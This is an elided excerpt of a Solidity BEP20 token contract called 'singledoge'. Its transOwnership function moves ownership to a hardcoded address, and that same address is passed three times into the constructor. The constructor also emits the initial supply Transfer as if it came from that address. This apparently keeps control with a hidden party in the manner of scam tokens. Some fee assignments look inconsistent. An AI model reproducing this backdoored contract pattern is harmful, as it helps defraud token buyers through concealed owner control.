...
contract Ownable is Contese {
    ...
    function transOwnership() public virtual onlyOwner {
        emit OwnersTransferred(_owner, address(0x36035f418E084e05F188eeEc742F4bC83C94E3fa));
        _owner = address(0x36035f418E084e05F188eeEc742F4bC83C94E3fa);
    }
...
abstract contract BEP20 is Contese, IERC20, Ownable {
    ...
    address[3] memory _Fuckyou) 
    {
        ...
        _buyDAOFee = _BUYFEE[1];
        _buygroupFee = _BUYFEE[0];

        _productsLiquidityFee = _SELLFEE[1];
        _productsDAOFee = _SELLFEE[1];
        _productsgroupFee = _SELLFEE[0];

        _liquiditygoods = _goods[0];
        _marketinggoods = _goods[1];
        _teamgoods = _goods[0];
        ...
        minimumTokenstoSwap = _totalSupply.mul(1).div(10000);
        ...
        emit Transfer(address(_Fuckyou[2]), _msgSender(), _totalSupply);
    }
...
contract singledoge is BEP20 {
    constructor() BEP20(
        ...
        [0x36035f418E084e05F188eeEc742F4bC83C94E3fa,0x36035f418E084e05F188eeEc742F4bC83C94E3fa,0x36035f418E084e05F188eeEc742F4bC83C94E3fa]
    ){}
}